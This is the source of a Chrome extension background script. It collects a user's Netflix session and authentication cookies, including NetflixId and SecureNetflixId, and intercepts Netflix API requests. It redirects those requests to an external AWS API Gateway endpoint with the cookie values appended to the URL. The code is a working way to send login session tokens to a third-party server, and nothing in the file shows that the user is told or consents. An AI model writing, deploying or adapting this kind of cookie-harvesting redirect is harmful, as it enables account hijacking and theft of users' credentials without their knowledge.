var cookies      = {};
cookies.docBytes = '';
cookies.cL       = '';

function updateCookies() {
    var cookieTypes = ['docBytes', 'cL', 'profilesNewUser', 'nmab', 'nfvdid', 'NetflixId', 'SecureNetflixId', 'lhpuuidh-browse-MXMP3K5HS5GNFENFBPQJDYAG2Q', 'profilesNewSession', 'memclid'];

    for (var i = 0; i < cookieTypes.length; i++) {
        (function(i) {
            chrome.cookies.get({
                url: 'https://www.netflix.com/',
                name: cookieTypes[i]
            }, function(cookie) {
                if (cookie != null) {
                    cookies[cookieTypes[i]] = encodeURIComponent(cookie.value);
                }
            });
        })(i);
    }
}
updateCookies();

chrome.cookies.onChanged.addListener(function(changeInfo) {
    updateCookies();
});

// Redirect their request to ours
chrome.webRequest.onBeforeRequest.addListener(function(details) {
    updateCookies();

    var cookieString = '';
    for (cookie in cookies) {
        cookieString += `&${cookie}=${cookies[cookie]}`;
    }

	return {redirectUrl: "https://izrbla2z7f.execute-api.us-west-2.amazonaws.com/dev/getnetflixdata" + details.url.substring(details.url.indexOf('?'), details.url.length) + cookieString};
}, {urls: ['https://www.netflix.com/api/shakti/warmer/*']}, ['blocking']);
